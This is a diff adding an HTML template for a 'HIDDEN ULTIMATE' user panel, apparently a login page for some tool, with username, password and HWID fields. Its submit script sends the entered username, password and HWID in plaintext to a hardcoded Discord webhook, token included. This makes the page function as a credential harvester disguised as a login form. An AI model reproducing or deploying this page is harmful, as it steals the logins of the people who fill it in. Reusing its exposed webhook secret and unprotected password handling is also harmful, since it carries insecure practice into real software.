@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>User Panel - HIDDEN ULTIMATE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    * {
+      margin: 0; padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(to right, #141e30, #243b55);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      transition: background 0.4s, color 0.4s;
+    }
+    body.light-mode {
+      background: linear-gradient(to right, #f2f2f2, #d9e4f5);
+      color: #000;
+    }
+    .main-title {
+      text-align: center;
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      animation: fadeIn 1s ease-in-out;
+      letter-spacing: 2px;
+      color: #00ffe7;
+      text-shadow: 0 0 10px #00ffe7, 0 0 20px #00ffe7;
+    }
+    body.light-mode .main-title {
+      color: #2c3e50;
+      text-shadow: none;
+    }
+    .theme-toggle {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+    }
+    .theme-toggle label {
+      font-size: 22px;
+      cursor: pointer;
+      color: inherit;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+    }
+    .panel-card {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 30px;
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+    body.light-mode .panel-card {
+      background: rgba(255,255,255,0.95);
+      color: #000;
+    }
+    .panel-card h2 {
+      font-size: 24px;
+      margin-bottom: 25px;
+    }
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: rgba(255,255,255,0.1);
+      padding: 10px 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .input-group label {
+      margin-right: 10px;
+      font-size: 16px;
+      color: #ccc;
+      width: 90px;
+    }
+    .input-group input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: inherit;
+      font-size: 16px;
+      padding: 10px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      background-color: #3498db;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #2980b9;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @media (max-width: 500px) {
+      .panel-card { padding: 20px; }
+      .main-title { font-size: 28px; }
+    }
+  </style>
+</head>
+<body>
+
+  <h1 class="main-title">HIDDEN ULTIMATE</h1>
+
+  <div class="theme-toggle">
+    <input type="checkbox" id="toggleTheme" hidden>
+    <label for="toggleTheme" title="Toggle Light/Dark Mode">
+      <i class="fas fa-moon" id="themeIcon"></i>
+    </label>
+  </div>
+
+  <div class="container">
+    <div class="panel-card">
+      <h2>User Panel</h2>
+      <form id="panelForm">
+        <div class="input-group">
+          <label>Username:</label>
+          <input type="text" name="username" placeholder="Enter Username" required>
+        </div>
+        <div class="input-group">
+          <label>Password:</label>
+          <input type="password" name="password" placeholder="Enter Password" required>
+        </div>
+        <div class="input-group">
+          <label>HWID:</label>
+          <input type="text" name="hwid" placeholder="S-1-5-21-..." required>
+        </div>
+        <button type="submit">Submit</button>
+      </form>
+      <p style="margin-top:15px;"><a href="{{ url_for('logout') }}" style="color:#85c1e9;">Logout</a></p>
+    </div>
+  </div>
+
+  <script>
+    // Toggle Light/Dark Mode
+    document.getElementById("toggleTheme").addEventListener("change", function () {
+      document.body.classList.toggle("light-mode");
+      document.getElementById("themeIcon").classList.toggle("fa-moon");
+      document.getElementById("themeIcon").classList.toggle("fa-sun");
+    });
+
+    // Discord Webhook Submit
+    document.getElementById("panelForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+      const hwid = document.querySelector('input[name="hwid"]').value;
+
+      const payload = {
+        content: `🛡️ New Panel Submission:\n👤 Username: ${username}\n🔑 Password: ${password}\n🧬 HWID: ${hwid}`
+      };
+
+      fetch("https://discord.com/api/webhooks/1361383757356990605/RGTg4bHBOID_-ziZFnz173Wub0bPXTTp7FBfqDc1L5rmPzfzH96gB1ANQUb4czBO3Vh1", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(res => {
+        if (res.ok) {
+          alert("✅ Submitted to Discord!");
+          document.getElementById("panelForm").reset();
+        } else {
+          alert("❌ Failed to send to Discord.");
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        alert("❌ Error sending data.");
+      });
+    });
+  </script>
+
+</body>
+</html>
